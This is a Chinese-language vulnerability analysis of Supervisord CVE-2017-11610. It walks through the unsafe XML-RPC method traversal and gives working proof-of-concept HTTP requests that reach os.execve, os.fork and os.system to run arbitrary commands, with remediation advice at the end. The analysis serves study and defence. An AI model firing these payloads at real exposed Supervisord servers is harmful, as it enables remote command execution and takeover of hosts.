@@ -1,0 +1,147 @@
+作者：[phith0n@长亭科技](https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html)
+前几天 Supervisord 出现了一个需认证的远程命令执行漏洞（CVE-2017-11610），在对其进行分析以后，[将靶场加入了 Vulhub
+豪华套餐](https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610)。
+#### Supervisord
+Supervisord 是一款 Python 开发，用于管理后台应用（服务）的工具，其角色类似于 Linux 自带的 Systemd。
+我觉得它相比 Systemd 有几个特点：
+  1. 配置比较简单
+  2. 一个简单的第三方应用，与系统没有耦合
+  3. 提供HTTP API，支持远程操作
+所以，我之前把他用来跑一些Web应用。
+Supervisord 的架构分为 Server 和 Client，Server 以一个服务的形式，跑在系统后台，而 Client
+是一个命令行工具，其实就是根据用户的要求，调用 Server 提供的 API，执行一些工作。
+查看 Supervisord 的配置文件可知，默认情况下，Server 端监听在 unix 套接字
+`unix:///tmp/supervisor.sock` 上，而 Client 配置的 serverurl 也是这个地址：
+    [unix_http_server]
+    file=/tmp/supervisor.sock   ; the path to the socket file
+    ;chmod=0700                 ; socket file mode (default 0700)
+    ;chown=nobody:nogroup       ; socket file uid:gid owner
+    ;username=user              ; default is no username (open server)
+    ;password=123               ; default is no password (open server)
+    ;[inet_http_server]         ; inet (TCP) server disabled by default
+    ;port=127.0.0.1:9001        ; ip_address:port specifier, *:port for all iface
+    ;username=user              ; default is no username (open server)
+    ;password=123               ; default is no password (open server)
+    [supervisorctl]
+    serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL  for a unix socket
+    ;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket
+    ;username=chris              ; should be same as in [*_http_server] if set
+    ;password=123                ; should be same as in [*_http_server] if set
+    ;prompt=mysupervisor         ; cmd line prompt (default "supervisor")
+    ;history_file=~/.sc_history  ; use readline history if available
+所以，Client 端去连接配置文件中的 serverurl 的地址，并与其使用 RPC 协议（基于 HTTP 协议）通信。比如我们平时常用的命令（启动名为
+web 的服务）：`supervisorctl start web`，看下其数据包：
+其实很简单的协议，通过 XML，将 methodName 和 params 通过 HTTP 协议传给服务端进行执行。start 命令执行的是
+`supervisor.startProcess` 方法，仅有一个参数就是服务的名称。
+另外，如果我设置了 `[inet_http_server]` 段，即可将 Supervisord 监听在 TCP
+端口上，这样外部其他程序也能进行调用。我们可以直接将默认配置文件中这一段前面的分号去掉，就默认监听在 9001 端口上了。
+#### 漏洞分析
+CVE-2017-11610 的本质是一个不安全的对象引用+方法调用，十分类似 Java 中的反序列化漏洞。
+在上一章中我说了，Supervisord 的控制实际上就是一个 C/S 以 RPC 协议的通信的过程，而 RPC 协议（远程过程调用协议），顾名思义就是 C
+端通过 RPC 协议可以在 S 端执行某个函数，并得到返回结果。那么，如果 C 端执行了 S 端预料之外的函数（如
+`os.system`），那么就会导致漏洞的产生。
+一个安全的 RPC 协议，会有一个函数名的映射，也就是说 C 端只能调用在白名单之中的部分函数，并且这个“函数”只是真正函数的一个映射。
+而我们来看看 3.3.2 版本中 Supervisord 是如何处理 RPC 调用的：
+    class supervisor_xmlrpc_handler(xmlrpc_handler):
+        ...
+        def call(self, method, params):
+            return traverse(self.rpcinterface, method, params)
+    def traverse(ob, method, params):
+        path = method.split('.')
+        for name in path:
+            if name.startswith('_'):
+                # security (don't allow things that start with an underscore to
+                # be called remotely)
+                raise RPCError(Faults.UNKNOWN_METHOD)
+            ob = getattr(ob, name, None)
+            if ob is None:
+                raise RPCError(Faults.UNKNOWN_METHOD)
+        try:
+            return ob(*params)
+        except TypeError:
+            raise RPCError(Faults.INCORRECT_PARAMETERS)
+`supervisor_xmlrpc_handlerl` 类用于处理 RPC 请求，其 call 方法就是真正执行远程调用的函数。在 call 方法中调用了
+traverse 函数，跟进这个函数，我们发现他的逻辑是这样：
+  1. 将 path 用点号分割成数组
+  2. 遍历这个数组，每次获得一个 name
+  3. 如果 name 不以下划线开头，则获取 ob 对象的 name 属性，其作为新的 ob 对象
+  4. 遍历完成后获得最终的 ob 对象，调用之
+所以，实际上这个函数最后达成的效果就是： **初始 ob 对象下的任意 public 方法，包括它的所有递归子对象的任意 public
+方法，都可以被调用** 。
+而此处，ob 对象即为 `self.rpcinterface`，官方开发者可能认为可调用的方法只限制在这个对象内部，所以没有做特别严格的白名单限制。
+而 CVE-2017-11610 的发现者发现，在 `self.rpcinterface.supervisor.supervisord.options`
+对象下，有一个方法 `execve`，其相当于直接调用了系统的 `os.execve` 函数，是可以直接执行任意命令的：
+    class ServerOptions(Options):
+        ...    
+        def execve(self, filename, argv, env):
+            return os.execve(filename, argv, env)
+所以，最后给出利用 POC（RPC 协议如何构造数据包、XML 是什么格式，这个可以自己去看看文档）：
+    POST /RPC2 HTTP/1.1
+    Host: localhost
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 439
+    supervisor.supervisord.options.execve
+    /usr/local/bin/python
+    python
+    -c
+    import os;os.system('touch /tmp/success');
+#### POC 缺陷与改进
+当然，漏洞发现者找到的这个 `self.rpcinterface.supervisor.supervisord.options.execve`
+其实不是那么好用，原因是，Python 的 `os.execve` 函数会使用新进程取代现有的进程。也就是说，这里会导致 Supervisord 本身退出。
+基于 Docker 容器的 Supervisord（如 Vulhub 里这个靶场），如果基础进程 Supervisord
+被退出，那么将导致整个容器被退出，即使我们执行了任意命令，我们获得的权限也是转瞬即逝的。
+另外，即使非Docker环境，我们在测试漏洞的过程中影响到了线上业务，这个后果是无法估量的，所以我们必须想其他方法来稳定的利用漏洞。
+我说两个方法。
+###### 法一：先Fork一个新进程
+同样在 `self.rpcinterface.supervisor.supervisord.options` 对象中，有一个 `fork`
+方法，是调用了系统的 `os.fork` 函数。
+`os.fork` 函数的作用就是根据当前进程，派生一个新的子进程。所以，即使当前进程被意外结束了，也不会导致 Supervisord
+服务终止，因为派生的进程还留存着。
+所以，先发送如下数据包即可派生新进程：
+    POST /RPC2 HTTP/1.1
+    Host: localhost
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 133
+    supervisor.supervisord.options.fork
+然后再发送之前的 POC 即可。
+但这个方法还是会影响 Docker 容器。
+###### 法二：找寻其他利用链
+这个漏洞和一些反序列化漏洞类似，都是去找到一个不安全的对象。那么，除了原作者给出的
+`self.rpcinterface.supervisor.supervisord.options.execve()`，是不是还可以找到其他更好用的利用链呢？
+通过一系列调试，我找到了一个利用链：
+`supervisor.supervisord.options.warnings.linecache.os.system()`，其实目的很简单，就是想方设法找到非下划线开头的属性中，是否有引用
+os 模块。linecache 中引用了 os 模块：
+所以，构造如下数据包：
+    POST /RPC2 HTTP/1.1
+    Host: localhost
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 275
+    supervisor.supervisord.options.warnings.linecache.os.system
+    touch /tmp/success
+即可直接执行任意命令。如，反弹 shell：
+#### 漏洞影响与修复
+出现这个漏洞，一般有几个条件：
+  1. Supervisord 版本在受影响的范围内
+  2. RPC 端口可被访问
+  3. RPC 无密码或密码脆弱
+第二个条件其实不太容易达到。默认安装的 Supervisord，是只监听 unix 套接字的，所以外部IP根本无法访问。
+另外，如果你已经拿到了一台机器的低权限，想访问本地的 unix 套接字，利用该漏洞提权，也是不现实的：原因是 supervisord.sock
+文件权限默认是 0700，其他用户无法访问，能够访问的用户权限和它是一样的，也就不存在提权的说法了。
+当然，如果运维同学不小心将 RPC 端口开放了，并且使用了默认密码或没有设置密码，那么借助这个漏洞进行攻击，也是很不错的。
+如何修复这个漏洞？
+  1. 升级 Supervisord
+  2. 端口访问控制
+  3. 设置复杂 RPC 密码
+* * *
